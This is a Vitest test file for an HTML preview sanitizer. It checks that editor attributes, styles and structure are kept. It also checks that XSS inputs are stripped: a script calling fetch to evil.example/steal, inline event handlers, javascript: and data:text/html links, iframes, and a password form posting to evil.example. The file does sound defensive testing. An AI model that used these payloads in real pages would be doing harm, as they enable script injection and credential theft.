import { describe, it, expect } from 'vitest';
import { sanitizePreviewHtml, escapeHtml } from './sanitize';

describe('sanitizePreviewHtml — editor requirements', () => {
  it('preserves data-w2p-id, without which the editor cannot select anything', () => {
    const html = '<p data-w2p-id="w2p-42">Hello</p>';
    expect(sanitizePreviewHtml(html)).toContain('data-w2p-id="w2p-42"');
  });

  it('preserves the hidden marker attribute', () => {
    const html = '<div data-w2p-id="w2p-1" data-w2p-hidden="1">x</div>';
    const result = sanitizePreviewHtml(html);
    expect(result).toContain('data-w2p-hidden');
  });

  it('keeps inline styles and style blocks so layout fidelity survives', () => {
    const html = '<style>p { color: red }</style><p style="margin: 4px">x</p>';
    const result = sanitizePreviewHtml(html);
    expect(result).toContain('color: red');
    // The sanitizer normalizes whitespace inside style values.
    expect(result).toMatch(/style="margin:\s*4px"/);
  });

  it('keeps structural content intact', () => {
    const html =
      '<article data-w2p-id="w2p-1"><h1>Title</h1><p>Body text</p>' +
      '<table><thead><tr><th>H</th></tr></thead><tbody><tr><td>C</td></tr></tbody></table>' +
      '<pre><code>const x = 1;</code></pre></article>';
    const result = sanitizePreviewHtml(html);

    expect(result).toContain('<h1>Title</h1>');
    expect(result).toContain('Body text');
    expect(result).toContain('<th>H</th>');
    expect(result).toContain('const x = 1;');
  });
});

describe('sanitizePreviewHtml — security (§31, §32)', () => {
  it('removes script tags and their contents', () => {
    const html = '<p>safe</p><script>fetch("https://evil.example/steal")</script>';
    const result = sanitizePreviewHtml(html);
    expect(result).not.toContain('<script');
    expect(result).not.toContain('evil.example');
  });

  it('removes inline event handlers', () => {
    const html = '<div onclick="alert(1)" onerror="alert(2)" onload="alert(3)">x</div>';
    const result = sanitizePreviewHtml(html);
    expect(result).not.toContain('onclick');
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('onload');
  });

  it('strips javascript: URLs', () => {
    const result = sanitizePreviewHtml('<a href="javascript:alert(1)">click</a>');
    expect(result).not.toContain('javascript:');
  });

  it('strips data:text/html URLs while allowing data: images', () => {
    const dangerous = sanitizePreviewHtml('<a href="data:text/html,<script>alert(1)</script>">x</a>');
    expect(dangerous).not.toContain('data:text/html');

    // Inlined images are the core of the snapshot design and must survive.
    const image = sanitizePreviewHtml('<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">');
    expect(image).toContain('data:image/png;base64');
  });

  it('removes iframes, objects and embeds', () => {
    const html = '<iframe src="https://evil.example"></iframe><object data="x"></object><embed src="y">';
    const result = sanitizePreviewHtml(html);
    expect(result).not.toContain('<iframe');
    expect(result).not.toContain('<object');
    expect(result).not.toContain('<embed');
  });

  it('removes form controls that could capture input', () => {
    const html = '<form action="https://evil.example"><input name="pw" type="password"></form>';
    const result = sanitizePreviewHtml(html);
    expect(result).not.toContain('<form');
    expect(result).not.toContain('<input');
  });
});

describe('escapeHtml', () => {
  it('escapes every HTML-significant character', () => {
    expect(escapeHtml('<script>&"\'')).toBe('&lt;script&gt;&amp;&quot;&#39;');
  });
});
